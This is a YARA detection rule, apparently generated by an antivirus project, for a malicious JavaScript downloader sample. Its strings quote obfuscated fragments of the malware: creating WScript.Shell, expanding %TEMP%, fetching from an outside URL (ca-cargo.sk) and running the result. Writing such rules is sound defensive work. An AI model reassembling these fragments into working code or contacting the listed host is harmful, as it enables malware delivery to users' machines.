rule sig_20160427_9c06c20dbb7329ca4ea914f69a3134fc {
  meta:
    description = "datamaliciousorder - file 20160427_9c06c20dbb7329ca4ea914f69a3134fc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e30ee7c8f68723ada7a92acf983ec7721d1ba0e3429767ff4903d44c6eb276cf"

  strings:
    $s1  = "function IcmwnSoovg() {return UnkxbJqbvd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Rz5dOOP" ascii
    $s2  = "function IcmwnSoovg() {return UnkxbJqbvd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Rz5dOOP" ascii
    $s3  = "function OlhpvZqoih(JdyhqVtiod, MqyrhLvbvn){KkmumQwhnr = KkmumQwhnr * 1; return JdyhqVtiod - MqyrhLvbvn;};" fullword ascii
    $s4  = "var UnkxbJqbvd = function EjfntMostd() {return AjbpgRcecz[FicpwAnnfl](\"WScript\"+\".Shell\");}(), GnvvfDrmbh = 11;" fullword ascii
    $s5  = "var AjbpgRcecz = this[\"WScript\"];" fullword ascii
    $s6  = "if (XubkoZqrcq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "function RfzraGuiwq(){return QzzztBdzgv + \"\";};" fullword ascii
    $s8  = "function MelkhIbzmq() {return ((NajlrOkrxk == true) && (NajlrOkrxk == AsjbmNyvpr)) ? 1 : KkmumQwhnr;};" fullword ascii
    $s9  = "XubkoZqrcq[QdwerNdaze](\"G\" + \"ET\", \"http://ca-cargo.sk/asl9ks\", false);" fullword ascii
    $s10 = "var FamemMqvsd = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "function YqvlpAlsor(QftrfKcerr){UnkxbJqbvd[\"R\"+\"un\"](QftrfKcerr, KkmumQwhnr, KkmumQwhnr);};" fullword ascii
    $s12 = "QsooyQnmvi = true;" fullword ascii
    $s13 = "var QsooyQnmvi = false;" fullword ascii
    $s14 = "}while (RpckyWwket);" fullword ascii
    $s15 = "function PybcjMrrba(){return FicpwAnnfl;};" fullword ascii
    $s16 = "function UalhtHqixm(FezgeBmtod) {var GmbawUpmhv = (1, 2, 3, 4, 5, FezgeBmtod); return GmbawUpmhv;};" fullword ascii
    $s17 = "NajlrOkrxk = true; " fullword ascii
    $s18 = "function KokzlSfckv()" fullword ascii
    $s19 = "var NajlrOkrxk = false;" fullword ascii
    $s20 = "return OlhpvZqoih(MjyguIuhkz, BtukyAwrdm);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}